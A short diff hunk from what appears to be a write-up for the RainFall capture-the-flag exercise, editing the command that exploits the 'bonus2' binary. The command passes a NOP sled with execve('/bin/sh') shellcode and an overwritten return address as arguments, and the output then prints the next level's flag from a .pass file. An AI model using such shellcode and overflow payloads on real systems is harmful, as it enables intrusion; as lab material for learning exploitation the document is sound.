@@ -194,7 +194,7 @@ $
 or
 
 ```shell
-bonus2@RainFall:~$ LANG=fi /home/user/bonus2/bonus2 `python -c "print '\x90' * 17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68
+bonus2@RainFall:~$ LANG=nl /home/user/bonus2/bonus2 `python -c "print '\x90' * 17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68
 \x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"` `python -c "print 'A' * 23 + '\x80\xF6\xFF\xBF'"`
 $ cat /home/user/bonus3/.pass
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
